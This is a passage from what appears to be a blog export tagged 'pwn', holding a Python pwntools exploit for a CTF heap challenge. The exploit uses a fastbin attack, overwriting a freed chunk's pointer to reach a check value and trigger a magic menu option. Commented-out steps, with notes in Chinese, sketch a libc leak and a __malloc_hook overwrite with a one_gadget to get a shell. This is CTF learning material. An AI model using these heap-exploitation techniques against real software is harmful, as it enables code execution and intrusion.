punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">creat</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap : \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#def dump(index):</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Command: \",\"4\")</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Index: \",str(index))</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#creat(0x10)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#allocate(0x10)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#allocate(0x80)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#free(2)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x6020ad</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">19</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>payloda2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4869\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#payload1=p64(0)*2+p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#fill(0,len(payload1),payload1)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#payload2=p64(0)*3+p64(0x21)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#fill(3,len(payload2),payload2)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">#allocate(0x10)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#allocate(0x10)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#payload3=p64(0)*3+p64(0x91)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#fill(3,len(payload3),payload3)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#allocate(0x80)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#free(4)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#dump(2)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#main_arena_88=u64(p.recvuntil(b'\\x7f')[-6:]+b'\\x00\\x00')</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#libc_base=main_arena_88-0x3c4b78 </span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">#5</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#fake_chunk= libc_base+0x3c4aed </span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">#6</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token comment\">#allocate (0x60) #回收一部分 chunk4</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token comment\">#free (4)  #使 chunk4 进入 fastbin 中</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\">#payload4=p64 (fake_chunk)  #改写 chunk4 的 fd 使 fake_chunk 进入 fastbin</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">#fill(2,len(payload4),payload4)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token comment\">#7</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\">#allocate (0x60)  #index4，分配 chunk4</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#allocate (0x60)  #index5，分配 fake_chunk</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\">#因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token comment\">#所以 malloc_hook=fake_chunk+0x23 (fake_chunk+0x33-0x10)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\">#payload5=p64(0)+p64(0)+p8(0)*3  #0x13</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\">#payload5+=p64 (libc_base+0x4526a)  #0x4526a 由 one_gadget 查找得到</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\">#fill(6,len(payload5),payload5)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\">#allocate (0x60)               #index6, 执行一次就会执行 malloc_hook，就可以 getshell</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        }
    ]
}